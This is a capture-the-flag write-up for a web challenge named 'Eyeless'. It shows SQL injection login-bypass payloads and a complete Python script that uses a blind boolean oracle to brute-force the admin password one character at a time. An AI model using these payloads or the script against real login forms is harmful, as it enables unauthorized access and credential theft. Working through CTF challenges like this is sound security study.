# Eyeless
## TL;DR
Blind SQL injection. Create oracle and brute-force the flag.

## Description
The challenge was in the web category, gave 150 points and had the following description:
```
Hack without seeing! Find us the admin password.

Connect here: http://jh2i.com:50011
```

When opening the url in the bowser, we can see the following:

![alt text](img/website.png)


After some exploration, it seems that the site is prone to SQL injection.
When providing it with the following credentials:
```
Username: admin ' or 1=1 #
Password: 123
```
it was possible to login as admin.

The output says:
```
Good job, but no flag here. :[
```

But we don't get the admin password.
As we do not get much feedback from the website, its not possible to dump the database and simply read out the password.

When posting the following credentials:
```
Username: admin ' and 0=1 #
Password: 123
```

the output looks differently:
```
YOU HACKER !!! HACKER !!! GO AWAY, HACKER!!!
```
This means that, if we provide a query that results in `True`, we can a different prompt, that if the query results in `False`.

## Exploitation

We can use this to guess one character of the flag after the other.
Thus, the `substring(s, pos, nb)` function is used, which returns the substring of *s*, beginning at index *pos*, ending at *pos+nb*.

Putting this in a query:
```
Username: admin' and substring(password, index, 1) == 'guessed_char' #
Password: 123
```
Now we can put everything into a script and brute-force all the characters:

```python

import requests
#start session
s = requests.Session()
#define our set of valid characters
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
#The challenge url
URL = "http://jh2i.com:50011/"
#the final flag/admin password
passwd = []

def check():
        #Position of the character we want to provide to the oracle
        pos = 1
        while True:
                for x in dictionary:
                        print("Trying: "+x)
                        #Set the data to check if we guessed the character at position pos right.
                        data = {'username' : 'admin\' and substring(password,'+str(pos)+',1)=\''+str(x)+"\'#", 'password' : "123"}
                        # Post the data to the website.
                        r = s.post(url = URL, data = data)
                        #if we see the word "HACKER", we know that the guess character is not correct
                        if("HACKER" in r.text):
                                #print(r.text)
                                continue
                        #else, we know that we guessed it correctly, and add to our flag string
                        else:   
                                passwd.append(x)
                                #print password progress
                                print(''.join(passwd))
                                pos +=1
                                #if we have our last character, break the endless loop
                                if(str(x) == "}"):
                                        print(''.join(passwd))
                                        return
                                break

check()

```

Tdaa, and we get the flag: `lls{blind_sql_injection_cant_be_done_with_braille}`
